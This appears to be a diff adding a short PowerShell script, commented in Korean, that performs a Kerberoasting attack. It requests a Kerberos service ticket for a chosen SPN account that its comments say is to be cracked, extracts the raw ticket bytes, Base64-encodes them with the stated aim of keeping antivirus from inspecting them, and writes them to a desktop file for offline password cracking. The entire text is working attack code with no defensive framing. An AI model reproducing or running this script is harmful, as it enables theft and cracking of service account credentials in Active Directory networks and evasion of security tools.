@@ -1,0 +1,13 @@
+# 1. 크래킹하려는 대상 SPN 계정의 티켓을 메모리에 다시 강제 로드
+Add-Type -AssemblyName System.IdentityModel
+$spn = "확인하신_SPN_주소"
+$token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
+
+# 2. 메모리에 로드된 티켓의 원시 바이너리 바이트(Byte) 추출
+$bytes = $token.GetRequest()
+
+# 3. 바이너리 데이터를 백신이 검사하지 못하도록 안전하게 Base64 텍스트로 변환
+$base64Ticket = [System.Convert]::ToBase64String($bytes)
+
+# 4. 바탕화면에 일반 텍스트 파일로 저장
+$base64Ticket | Out-File -FilePath "$env:USERPROFILE\Desktop\ticket.txt"
